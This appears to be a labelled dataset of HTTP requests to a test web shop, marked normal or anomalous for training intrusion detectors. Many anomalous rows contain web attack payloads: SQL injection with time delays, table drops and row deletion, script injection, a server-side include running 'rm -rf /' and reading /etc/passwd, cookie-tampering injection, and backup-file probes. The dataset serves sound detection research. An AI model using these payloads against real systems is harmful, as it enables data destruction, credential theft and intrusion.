"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = yitan & password = barraquer6 & nombre = pirro & apellidos = zurita + santander & email = gisladottir @ ingenieriadelaconstruccion . bh & dni = 96580643d & direccion = c /  + chisperos ,  + s / n ,  + 3 - h & ciudad =  * ceclavín & cp = 43144 & provincia = burgos & ntc = 6951238720062630 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = chatchai & password = chismorrear & nombre = rachid & apellidos = mingo + elbaile & email = schkorski @ elxxi . zr & dni = 26852714f & direccion = paraguay ,  + 88 ,  + 5 ? e & ciudad = aulesti & cp =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & provincia = la + rioja & ntc = 2647099047093404 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = vino + rioja & precio = 85 & cantidada = 18 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1202 < ! -  -  # exec + cmd =  "" rm +  - rf +  /  ; cat +  / etc / passwd ""  +  -  -  >  & b1 = pasar + por + caja",1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = parkash6 & password = tornillo & nombre = isaías & apellidos = mansur + morales & email = ragovic @ fichajes . nom . pe & dni = 66467903l & direccion = calle + puerto + de + balbaran ,  + 63 ,  + 12 ? d & ciudad = laukiz & cp = 08783 & provincia = pontevedra & ntc = 0882217820565052 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 /  & nombre = vino + rioja & precio = 85 & cantidad = 46 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 39 /  & cantidad = 17 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = hutt & password = 6s19r9u13o & nombre = antú & apellidosa = laris + ull & email = behrens0 @ professionalhost . tr & dni = 28809888l & direccion = cami + la + parra + 73 +  & ciudad = sella & cp = 39587 & provincia = madrid & ntc = 5101738813776143 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = o . murchu & pwd =  . perrera & remember = onbob @  < script > alert ( paros )  <  / script >  . parosproxy . org & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 285 @ 40 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = kilner & pwd = gurbia & remember =  ' or ' a =  ' a & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = any ? set - cookie :  + tamper = 1041264011025374727 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = any ? set - cookie :  + tamper = 1041264011025374727 & cantidad = 14 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login =   & pwd = mi4lo & remember = on & b1 = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = ofcparms & password = mutabilidad & nombre = petronio & apellidos = pedrol & email = cadoret @ escuelamontessori . pa & dni = 17229359j & direccion = hermanas + sanchez + tamargo ,  + 56 +  & ciudad = moreruela + de + los + infanzones & cp = 13770 & provincia = huelva & ntca = 9991778846189173 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = perkins '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & pwd = 7ad524z & remember = off & b1 = entrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5484 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / miembros / editar . jspmodoa = registro & login = gia & password = desplumar & nombre = eurico & apellidos = lestany + borbonio & email = sanchez - polack @ beautifulbody . zr & dni = 60400355d & direccion = calle + princep + d ' asturies + 98 + 13 ? c & ciudad = bovera & cp = 46167 & provincia = lugo & ntc = 5219825942827729 & b1 = registrar,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1880 & b1 = confirmar,0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = afo & pwd = 2esens45ñ8r & remember = off & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = paros ""  + style =  "" background : url ( javascript : alert (  ' paros '  )  )  & id = 2",1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = vanderbi & password = brechar & nombre = rudolph & apellidos = simo + baixaulí & email = guarneros @ elfisioencasa . eu & dni = 07929654j & direccion = d '  + irlanda ,  + 150 ,  + 4g & ciudada = cruïlles ,  + monells + i + sant + sadurní + de + l ' heura & cp = 22362 & provincia = palencia & ntc = 7146200335863301 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = bejar & password = litigar < script > alert (  "" paros ""  )  ;  <  / script >  & nombre = enzo & apellidos = capell + latre & email = borgato @ 19horas . ee & dni = 96483882d & direccion = esperanto ,  + 182 ,  +  & ciudad = sobremunt & cp = 19278 & provincia = alicante & ntc = 2319237634289833 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 39 & cantidad = 98 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = shari & pwd = agobiado & remember = on & b1a = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = peers & password = at222a1 & nombre = cipriana & apellidos = serradell & email = cornthwaite @ clichotel . do & dni = 19247264j & direccion = c /  + joventut ,  + 182 ,  +  & ciudad = am /  ?  . pudia & cp = 31510 & provincia = salamanca & ntc = 8765134980053757 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = puran & password = 3inst9um6n90 & nombre = magno & apellidos = viladric + ylla & email = remeck2 @ bruñoseguridad . aero & dni = 94584030a & direccion = camino + de + los + girasoles ,  + 138 ,  +  & ciudad = par ? adas & cp = 33402 & provincia = valladolid & ntc = 0497803350257870 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 39 & cantidad = 32 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 715 & b1 = pasar + por + caja '  + delete + from + users,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = ques + o + manchego & precio = 85 & cantidad = 73 & b1 = añadir + al + carrito,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = starkeba & pwd = 3a13he4a & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lemar & password = 43lpe7de2o & nombre = bianca & apellidos = valor + agudo & email = vallarine7 @ 7horas . mo & dni = 90125861q & direccion = plaza + monasterio + de + la + oliva ,  + s / n ,  +  & ciudad = tembleque & cp = 20493 & provincia = na * v + a . rra & ntc = 7119531551958366 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = gedeon & password = 54r72il031o & nombre = yuray & apellidos = montserrat + pugeo & email = jose _ digges @ blanquillos . aq & dni = 45447133f & direccion = carretera + de + arcos ,  + 174 +  & ciudad = aldeavieja + de + tormes & cp = 46890 & provincia = paros ""  style =  "" background : url ( javascript : alert (  ' paros '  )  )  & ntc = 2175163155221209 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 84 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lodesert & password = herramienta & nombre = edelmira & apellidos = capo + garcía & email = bugbee @ farma - job . cd & dni = 55645514g & direccion = c /  + santander + s / n ,  +  & ciudad = roca + de + la + sierra ,  + la & cp = 05289 & provincia = badajoz & ntc = 4927358900726396 & b1 = registrarany ? set - cookie :  + tamper = 5765205567234876235",1
localhost : 8080 / tienda1 . inc,1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = amandy & pwd = 110ac52na22da2 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 401 & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = yung - fu & password = 8ach35 & nombre = atico & apellidos = farzati + bolàs & email = gobert @ olvidalo . sh & dni = 87238782n & direccion = calle + salamanca ,  + 147 ,  + 12 - c & ciudad = llacuna ,  + la & cp = 42192 & provinciaa = la + rioja & ntc = 6202220690818816 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = bassigna & pwd = recercar & remember = on & b1a = entrar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = flynn & password = alarm ? ista & nombre = zelina & apellidos = morcillo + amparan & email = colona @ aebo . lb & dni = 86164975y & direccion = alamo ,  + s / n ,  +  & ciudad = casas + de + reina & cp = 05413 & provincia = salamanca & ntc = 163975271288072a & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = sheila & pwd = culero & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = hyong - ju9 & password = cuidadora & nombre = vladimir & apellidos = yaben + billini & email = kempf @ gemas . org . mr & dni = 71246547e & direccion = san + francisco + de + paula + 67 + 11 - c & ciudad = trasobares & cp = 23746 & provincia = teruel & ntca = 0763433246447327 & b1 = registrar,1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 8949 & b1 = confirmar,0
localhost : 8080 / tienda1 / global / menum . jsp . bak,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = tsern & password = s87aboc9do4 & nombre = nadir & apellidos = ganci + zanuy & email = wolfstone @ g - audio . a @ ero & dni = 01364603j & direccion = carrer + sant + antoni ,  + s / n +  & ciudad = torre + del + bierzo & cp = 33780 & provincia = ourense & ntc = 6172384858877900 & b1 = registrar",1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = wingtai & password = colipava & nombre = libel & apellidos = roger + gabarro & email = mcwade @ fortelingenieria . am & dni = 32794604p & direccion = avenida + pio + xii + 192 ,  + 8 - a & ciudad = puebla + de + san + medel & cp = 50637 & provincia = girona & ntc = 7057085225551065 & b1 = registrar",0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 5492 & b1 = confirmar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = jamón + ibérico & precio = 85 & cantidad = 32 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = blan ,  / ch / a & pwd = atajada & remember = on & b1 = entrar",1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 85 & cantidad = 94 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = matilde13 & pwd = extrema & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = vinet '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & password = rel + atoría & nombre = ihor & apellidos = bedos & email = sangareau @ faders . com . mil & dni = 74830064r & direccion = santa + agueda ,  + s / n + 5 ? g & ciudad = zarza + de + montánchez & cp = 28191 & provincia = jaén & ntc = 9112082229252110 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2103 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = ayse & pwd = quillotrar & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 4708 & b1 = pasar + por + caja,1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 75 & b1 = añadir + al + carrito,0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3774 & b1 = confirmar,0
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3871 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = fabio & password = hí5pid0 & nombre = raidon & apellidos = soma + bañuelos & email = alfa - brownlee @ cocheacoche . ec & dni = 39887687y & direccion = c /  + 304 + 63 ,  + 5b & ciudad = gu + is + ando & cp = 37730 & provincia = castellón & ntc = 2707865601601464 & b1 = registrar",1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = christer & pwd = perf706 & remember = on & b1 = entrar,0
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = vino + rioja & precio = 39 & cantidad = 86 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = tailor & pwd = inju2i44t2 & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = field & password = 4a006tazo & nombre =  +  ? even & apellidos = acceldas & email = ruskin @ 15horas . se & dni = 63950758v & direccion = irene + fernandez + perera + 77 +  & ciudad = sartajada & cp = 07142 & provincia = madrid & ntc = 1275106051251024 & b1 = registrar,1
http :  /  / localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = dunstan & password = 9is4er4e3s4 & nombre = wenceslada & apellidos = sabando + trujillo & email = siriaque @ cortell . ly & dni = 31996824y & direccion = passeig + torreblanca + 19 + 1h & ciudad = hontoria + del + pinar & cp = 37110 & provincia = barcelona & ntc = 0259427971167694 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo =   & login = doraine & pwd = parra & remember = off & b1 = entrar,1
"http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = earles & password = 2air3l2ta & nombre = esdras & apellidos = codo + eberlé & email = aguirre @ errebebe . tw & dni = 74023904z & direccion = c /  + don + quijote + 159 ,  +  & ciudad = fresneda + de + la + sierra & cp = 07628 & provincia = girona & ntc = 2670726326457119 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodoa = registro & login = cathal & password = m52ope7a & nombre = apeles & apellidos = capafons + melgarejo & email = crane7 @ privatebanking . com . nc & dni = 80723845d & direccion = c /  + doctor + sanchez + cozar ,  + 88 ,  +  & ciudad = herrera ,  + la & cp = 24100 & provincia = lleida & ntc = 9690651027798587 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombrea = vino + rioja & precio = 39 & cantidad = 17 & b1 = añadir + al + carrito,1
